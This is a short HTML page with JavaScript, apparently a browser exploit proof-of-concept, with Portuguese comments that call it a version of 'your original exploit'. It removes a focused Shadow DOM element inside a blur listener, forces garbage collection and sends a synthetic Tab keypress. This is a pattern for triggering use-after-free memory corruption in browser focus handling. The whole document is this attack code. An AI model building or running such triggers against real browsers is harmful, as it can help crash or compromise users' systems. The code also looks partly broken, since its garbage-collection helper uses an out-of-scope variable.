<!DOCTYPE html>
<html>
<body>
<div id="host"></div>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = { i: "ab" + i + (i / 100000) };
        temp += "foo";
        gcRec(n - 1);
    }
    for (var i = 0; i < 10000; i++) gcRec(10);  
}

// Configuração do Shadow DOM
let shadowRoot = host.attachShadow({ mode: 'open' });
let victim = document.createElement('div');
victim.tabIndex = 0;
victim.textContent = 'Focusable Shadow Victim';
shadowRoot.appendChild(victim);
victim.focus();

// Listener de blur com a sua técnica de remoção cirúrgica e GC pesado
document.addEventListener('blur', (e) => {
    if (victim) {
        victim.remove();
        victim = null;
    }
    gc();
}, { capture: true, once: true });

// Aciona a mudança de foco simulando a tecla Tab diretamente no elemento
setTimeout(() => {
    if (victim) {
        // Dispara o evento de teclado sintético (Tab) exatamente como no seu exploit original
        victim.dispatchEvent(new KeyboardEvent('keydown', {
            bubbles: true,
            cancelable: true,
            view: window,
            key: 'Tab',
            code: 'Tab',
            keyCode: 9
        }));
    }
}, 50);
</script>
</body>
</html>
